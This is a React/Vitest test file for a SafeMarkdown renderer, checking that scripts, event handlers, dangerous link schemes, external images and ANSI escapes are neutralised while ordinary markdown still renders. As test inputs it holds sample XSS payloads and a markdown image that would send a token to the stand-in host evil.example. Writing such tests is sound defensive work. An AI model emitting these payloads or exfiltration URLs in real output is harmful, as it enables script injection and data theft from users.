import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { SafeMarkdown } from './SafeMarkdown';

function html(text: string): string {
  const { container } = render(<SafeMarkdown text={text} />);
  return container.innerHTML;
}

describe('SafeMarkdown', () => {
  it('never renders raw html, scripts or event handlers', () => {
    const out = html(
      '<script>alert(1)</script><img src=x onerror="alert(2)"><b onclick="x()">bold</b>',
    );
    expect(out).not.toContain('<script');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('<img');
  });

  it('does not make javascript:, data: or vbscript: links clickable', () => {
    for (const href of [
      'javascript:alert(1)',
      'data:text/html,<b>x',
      'vbscript:x',
      'JaVaScRiPt:alert(1)',
    ]) {
      const { container } = render(<SafeMarkdown text={`[click](${href})`} />);
      expect(container.querySelector('a')).toBeNull();
    }
  });

  it('keeps http/https/mailto links and opens them safely', () => {
    const { container } = render(
      <SafeMarkdown text="[a](https://example.com) [m](mailto:a@b.co)" />,
    );
    const links = [...container.querySelectorAll('a')];
    expect(links.map((a) => a.getAttribute('href'))).toEqual([
      'https://example.com',
      'mailto:a@b.co',
    ]);
    for (const a of links) {
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
      expect(a.getAttribute('target')).toBe('_blank');
    }
  });

  it('does not load external images (they can exfiltrate data through the URL)', () => {
    const { container } = render(<SafeMarkdown text="![secret](https://evil.example/?d=TOKEN)" />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('图片已拦截');
  });

  it('strips ANSI escapes and control characters', () => {
    const { container } = render(<SafeMarkdown text={'\u001b[31mred\u001b[0m\u0007 ok'} />);
    expect(container.textContent).toContain('red ok');
    expect(container.textContent).not.toContain('\u001b');
  });

  it('renders ordinary markdown', () => {
    const { container } = render(
      <SafeMarkdown text={'# 标题\n\n- a\n- b\n\n```js\nconst x = 1;\n```'} />,
    );
    expect(container.querySelector('h1')?.textContent).toBe('标题');
    expect(container.querySelectorAll('li')).toHaveLength(2);
    expect(container.querySelector('pre code')?.textContent).toContain('const x = 1;');
  });
});
